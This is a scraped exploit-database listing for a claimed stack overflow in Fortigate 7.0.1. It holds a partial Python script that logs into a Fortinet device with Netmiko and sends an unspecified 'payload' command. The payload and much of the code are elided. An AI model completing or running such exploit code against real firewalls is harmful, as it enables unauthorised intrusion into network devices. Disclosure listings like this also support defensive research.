---
title: Fortigate 7.0.1 Stack Overflow
url: https://cxsecurity.com/issue/WLB-2023050004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-04
fetch_date: 2025-10-04T11:36:50.867376
---
...
|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Fortigate 7.0.1 Stack Overflow** **2023.05.03**  Credit:  **[Cody Sixteen](https://cxsecurity.com/author/Cody%2BSixteen/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |
...
'username' : login,
'password' : passwd,
'device\_type' : 'fortinet'
}
print("> connecting to the target: %s" % target)
net\_connect = Netmiko(\*\*fw\_01)
# print( net\_connect.find\_prompt() )
...
command = payload
full\_config\_cmd = net\_connect.send\_command( command )
print(full\_config\_cmd)
print("done")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050004)
